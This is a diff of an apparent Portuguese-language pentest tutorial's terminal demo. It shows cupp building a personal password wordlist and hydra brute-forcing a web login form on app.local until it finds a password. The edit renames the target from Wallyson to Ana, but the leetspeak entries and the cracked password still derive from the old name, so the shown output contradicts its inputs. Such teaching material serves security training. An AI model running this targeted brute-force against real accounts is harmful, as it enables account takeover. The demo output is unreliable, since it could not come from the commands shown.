@@ -217,7 +217,7 @@ svn teamspeak telnet[s] vmauthd vnc xmpp`,
           {
             comment: "gerar mutações da senha base com cupp",
             cmd: "cupp -i",
-            out: `[+] First Name: Wallyson
+            out: `[+] First Name: Ana
 [+] Surname: Lopes
 [+] Nickname: wd
 [+] Birthdate (DDMMYYYY): 14021990
@@ -229,26 +229,26 @@ svn teamspeak telnet[s] vmauthd vnc xmpp`,
 [+] Leet mode? (y/n): y
 
 [+] Now making a dictionary...
-[+] Saving dictionary to wallyson.txt, counting 14672 words.`,
+[+] Saving dictionary to ana.txt, counting 14672 words.`,
             outType: "info",
           },
           {
-            cmd: "head -10 wallyson.txt",
-            out: `wallyson
-Wallyson
-WALLYSON
-wallyson1990
-Wallyson1990
-wallyson@1990
-Wallyson@1990
+            cmd: "head -10 ana.txt",
+            out: `ana
+Ana
+ANA
+ana1990
+Ana1990
+ana@1990
+Ana@1990
 w@lly$0n
 W@lly$0n
 luna1990`,
             outType: "default",
           },
           {
-            cmd: "hydra -l wallyson -P wallyson.txt app.local https-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
-            out: "[443][http-post-form] host: app.local   login: wallyson   password: W@lly$0n@1990",
+            cmd: "hydra -l ana -P ana.txt app.local https-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
+            out: "[443][http-post-form] host: app.local   login: ana   password: W@lly$0n@1990",
             outType: "warning",
           },
         ]}
